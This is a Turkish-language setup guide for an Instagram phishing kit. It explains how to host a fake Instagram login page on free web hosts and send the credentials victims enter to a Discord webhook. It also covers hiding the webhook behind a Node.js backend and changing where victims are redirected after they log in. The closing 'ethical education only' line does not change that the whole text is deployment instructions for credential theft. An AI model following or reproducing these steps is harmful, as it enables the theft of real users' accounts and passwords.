# Instagram Phishing Site Kurulum Rehberi

Bu paket, Instagram phishing sitesini dışarıda çalıştırmanız için gereken tüm dosyaları içerir. İki farklı kurulum yöntemi sunulmuştur.

## 1. Statik Versiyon (InfinityFree, GitHub Pages vb.)

Bu yöntem sadece statik dosyaları kullanır ve herhangi bir sunucu gerektirmez. Discord webhook'u doğrudan frontend kodundan çağrılır.

### Kurulum Adımları:

1. `public` klasöründeki tüm dosyaları hostinginizin ana dizinine yükleyin:
   - `public/index.html` → ana dizine
   - `public/assets/` → ana dizine (klasörün tamamı)
   - `public/images/` → ana dizine (klasörün tamamı)

2. Dosya yapınız şöyle olmalıdır:
   ```
   /htdocs (veya public_html)
   ├── index.html
   ├── assets/
   │   ├── index-*.js
   │   └── index-*.css
   └── images/
       ├── facebook.png
       ├── icon.png
       ├── instagram_logo.png
       └── instagram.png
   ```

3. Bu yöntemle site çalışmaya hazırdır. Herhangi bir ayarlama gerekmez.

### Not:
- CORS (Cross-Origin Resource Sharing) hataları yaşanabilir
- Discord webhook URL'i frontend kodunda görünür durumdadır

## 2. Tam Versiyon (Node.js Destekli Hostingler)

Bu yöntem hem frontend hem de backend kodunu içerir. Discord webhook istekleri backend üzerinden yapılır, bu sayede webhook URL'i gizli kalır.

### Kurulum Adımları:

#### a) Netlify ile Kolay Kurulum:
1. GitHub/GitLab hesabınıza bu paketteki tüm dosyaları yükleyin
2. Netlify.com'da yeni bir site oluşturun ve repo'nuzu seçin
3. Netlify otomatik olarak `netlify.toml` dosyasını kullanarak sitenizi kuracaktır

#### b) Diğer Node.js Hosting (Heroku, Vercel vb.):
1. Bu paketteki tüm dosyaları hosting'e yükleyin
2. Node.js 16+ sürümünü kullandığınızdan emin olun
3. Şu komutları çalıştırın:
   ```
   npm install --production
   NODE_ENV=production node index.js
   ```

### Not:
- Bu yöntem daha güvenlidir çünkü Discord webhook URL'i backend kodunda saklanır
- Node.js çalıştırabilen bir hosting gerektirir

## Yönlendirme URL'ini Değiştirme

Kullanıcılar giriş yaptıktan sonra yönlendirilecek URL'i değiştirmek için:

1. Eğer statik versiyonu kullanıyorsanız:
   - `public/assets/index-*.js` dosyasında `REDIRECT_URL` veya `https://itiraflar.kesug.com/hata/` aramasi yapın ve istediğiniz URL ile değiştirin
   - Örneğin: "https://itiraflar.kesug.com/hata/" yerine "https://facebook.com" yazabilirsiniz

2. Eğer tam versiyonu kullanıyorsanız:
   - Aynı şekilde `public/assets/index-*.js` dosyasında aynı değişiklikleri yapabilirsiniz

## Güvenlik Uyarısı

Bu site sadece etik eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasalara aykırı olabilir.